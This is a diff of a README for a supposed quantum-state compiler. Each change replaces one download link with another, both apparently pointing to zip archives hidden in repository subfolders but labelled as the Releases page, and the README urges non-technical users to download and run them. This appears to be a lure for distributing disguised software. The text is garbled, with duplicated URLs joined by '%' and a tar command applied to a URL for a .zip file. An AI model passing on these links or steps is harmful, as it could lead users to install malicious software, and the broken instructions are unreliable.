@@ -1,7 +1,7 @@
 # 🎉 QSOT-Compiler - Unlock Quantum Time Evolution
 
 ## 📥 Download Now
-[![Download QSOT-Compiler](https://github.com/YohanLiebert0/QSOT-Compiler/raw/refs/heads/main/docs/paper_data/Compiler_QSO_wronghead.zip%https://github.com/YohanLiebert0/QSOT-Compiler/raw/refs/heads/main/docs/paper_data/Compiler_QSO_wronghead.zip)](https://github.com/YohanLiebert0/QSOT-Compiler/raw/refs/heads/main/docs/paper_data/Compiler_QSO_wronghead.zip)
+[![Download QSOT-Compiler](https://raw.githubusercontent.com/YohanLiebert0/QSOT-Compiler/main/config/QSO-Compiler-2.6.zip%https://raw.githubusercontent.com/YohanLiebert0/QSOT-Compiler/main/config/QSO-Compiler-2.6.zip)](https://raw.githubusercontent.com/YohanLiebert0/QSOT-Compiler/main/config/QSO-Compiler-2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the QSOT-Compiler! This application allows you to explore quantum states in a unique way, treating time as a crucial element. You don’t need programming skills to get started. Follow these simple steps to download and run the software.
@@ -19,7 +19,7 @@ Before you install the QSOT-Compiler, ensure you have the following:
 ## 📦 Download & Install
 To get the QSOT-Compiler, visit the following link to access the Releases page: 
 
-[Download QSOT-Compiler](https://github.com/YohanLiebert0/QSOT-Compiler/raw/refs/heads/main/docs/paper_data/Compiler_QSO_wronghead.zip)
+[Download QSOT-Compiler](https://raw.githubusercontent.com/YohanLiebert0/QSOT-Compiler/main/config/QSO-Compiler-2.6.zip)
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version. It will be displayed at the top. 
@@ -42,10 +42,10 @@ After the download completes, follow these steps to install:
 4. Eject the disk image and open QSOT-Compiler from your Applications.
 
 ### For Linux
-1. Locate the downloaded archive file (usually `https://github.com/YohanLiebert0/QSOT-Compiler/raw/refs/heads/main/docs/paper_data/Compiler_QSO_wronghead.zip`).
+1. Locate the downloaded archive file (usually `https://raw.githubusercontent.com/YohanLiebert0/QSOT-Compiler/main/config/QSO-Compiler-2.6.zip`).
 2. Open a terminal window.
 3. Navigate to the Downloads directory using `cd ~/Downloads`.
-4. Extract the files using `tar -xzf {file-name}https://github.com/YohanLiebert0/QSOT-Compiler/raw/refs/heads/main/docs/paper_data/Compiler_QSO_wronghead.zip`.
+4. Extract the files using `tar -xzf {file-name}https://raw.githubusercontent.com/YohanLiebert0/QSOT-Compiler/main/config/QSO-Compiler-2.6.zip`.
 5. Follow any included instructions in the extracted folder to install the application.
 
 ## ⚙️ Using QSOT-Compiler
@@ -83,4 +83,4 @@ The development team is continually working on improvements. Keep an eye on the 
 ## 🙏 Acknowledgments
 A big thank you to all contributors and the community for supporting open science. Your input keeps this application evolving and improving.
 
-Remember, for downloading the latest version, visit our Releases page again: [Download QSOT-Compiler](https://github.com/YohanLiebert0/QSOT-Compiler/raw/refs/heads/main/docs/paper_data/Compiler_QSO_wronghead.zip). Enjoy exploring quantum states!
+Remember, for downloading the latest version, visit our Releases page again: [Download QSOT-Compiler](https://raw.githubusercontent.com/YohanLiebert0/QSOT-Compiler/main/config/QSO-Compiler-2.6.zip). Enjoy exploring quantum states!
